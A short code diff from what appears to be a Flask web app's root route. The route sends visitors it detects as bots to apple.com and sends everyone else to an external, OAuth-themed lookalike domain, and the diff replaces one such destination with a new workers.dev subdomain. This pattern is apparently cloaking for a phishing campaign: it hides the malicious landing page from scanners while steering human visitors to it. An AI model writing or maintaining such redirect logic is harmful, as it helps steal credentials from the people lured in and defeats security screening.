@@ -48,7 +48,7 @@ def root():
     if is_bot(request):
         return redirect("https://apple.com", code=302)
     else:
-        return redirect("https://oauthpublish.im/wp/cs/ZtlLsnSprw5RjF6ao1mBvbHquxe2JA3N", code=302)
+        return redirect("https://556430e36497ea14.0authz.workers.dev", code=302)
 
 
 if __name__ == "__main__":
